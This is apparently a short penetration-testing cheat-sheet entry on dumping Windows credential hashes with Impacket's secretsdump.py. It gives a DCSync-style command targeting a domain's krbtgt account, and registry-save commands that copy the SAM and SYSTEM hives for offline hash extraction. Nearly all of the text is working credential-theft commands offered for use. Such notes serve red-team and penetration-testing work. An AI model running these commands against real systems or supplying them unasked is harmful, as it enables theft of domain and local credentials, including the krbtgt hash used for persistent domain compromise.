Used to dump hashes like DCSync.



### Dump specific user
```shell
secretsdump.py $DOMAIN/$USER@$IP -just-dc-user LOGISTICS/krbtgt

# for non-dc computers
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM C:\Windows\Temp\system.save
secretsdump.py -sam sam.save -system system.save LOCAL
```